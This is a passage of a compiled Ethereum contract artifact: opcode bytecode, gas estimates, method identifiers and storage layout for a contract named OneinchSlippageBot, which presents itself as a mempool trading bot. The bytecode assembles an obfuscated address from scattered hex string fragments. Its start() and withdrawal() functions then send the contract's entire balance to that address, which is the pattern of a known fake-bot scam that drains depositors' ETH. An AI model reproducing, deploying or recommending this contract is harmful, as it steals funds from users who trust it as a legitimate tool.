REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x32A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2D1 PUSH2 0x2CC PUSH2 0x395 JUMP JUMPDEST PUSH2 0x6B3 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x2FA PUSH2 0x908 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x325 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x33C PUSH2 0x337 PUSH2 0x395 JUMP JUMPDEST PUSH2 0x6B3 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x365 PUSH2 0x908 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x390 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x3A0 PUSH2 0x910 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3AC PUSH2 0x94D JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3B8 PUSH2 0x98A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3C4 PUSH2 0x9C7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3D0 PUSH2 0xA04 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3DC PUSH2 0xA41 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3E8 PUSH2 0xA7E JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3F4 PUSH2 0xABB JUMP JUMPDEST SWAP1 POP DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP10 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x434 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x411 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP9 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x485 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x462 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP8 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x4D6 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x4B3 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP7 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x527 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x504 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x578 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x555 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x5C9 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x5A6 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x61A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x5F7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x66B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x648 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP9 POP POP POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP9 POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x8FB JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x6E1 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x703 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x754 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x764 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x7FE JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7A2 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7B2 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x7FD JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7F0 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7FC JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x83C JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x84C JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x8E6 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x88A JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x89A JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x8E5 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x8D8 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8E4 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x6C5 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078433062330000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3538654237330000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3641366238000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3937413836450000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3136374239640000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4135423800000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4235653434000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3730373600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 0xEE PUSH31 0xEBC8C667AD02FE088390F250BE4B3EB665C8F6B0863FC6FEAAA379C1026473 PUSH16 0x6C634300060C00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "572400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"beyond(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct OneinchSlippageBot.slice memory)": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"fetchMempoolData()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getBa()": "25",
						"getMempoolCode()": "infinite",
						"getMempoolHeight()": "infinite",
						"getMempoolLog()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"getMempoolStart()": "infinite",
						"keccak(struct OneinchSlippageBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct OneinchSlippageBot.slice memory,struct OneinchSlippageBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct OneinchSlippageBot.slice memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 8,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 10,
						"contract": "contracts/bot.sol:OneinchSlippageBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}